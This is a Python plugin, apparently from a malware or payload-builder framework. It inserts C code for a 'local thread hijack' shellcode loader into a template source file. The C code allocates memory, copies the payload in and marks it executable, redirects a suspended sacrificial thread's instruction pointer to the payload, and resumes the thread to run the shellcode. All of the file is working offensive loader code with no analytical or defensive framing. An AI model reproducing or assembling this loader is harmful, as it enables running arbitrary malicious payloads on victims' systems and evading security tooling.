def desc():
    return "Use a local Thread Hijack to run the payload"

def run():
    functions = '''\
BOOL HijackThread(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	PVOID    pAddress         = NULL;
	DWORD    dwOldProtection  = NULL;
	CONTEXT  ThreadCtx        = { 
		.ContextFlags = CONTEXT_CONTROL 
	};

    // Allocating memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)){
		return FALSE;
	}

	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;

	// Updating the new thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		return FALSE;
	}

	return TRUE;
}

void DummyFunction() {
	return;
}
'''
    execution = '''\
	HANDLE hThread = NULL;

	// Creating sacrificial thread in suspended state
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		return FALSE;
	}

	// Hijacking the sacrificial thread created
	if (!HijackThread(hThread, pShellcode, sPayloadSize)) {
		return -1;
	}

	// Resuming suspended thread, so that it runs our shellcode
	ResumeThread(hThread);\
'''
    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{EXECUTION}}", execution) \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}")

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)
    
    return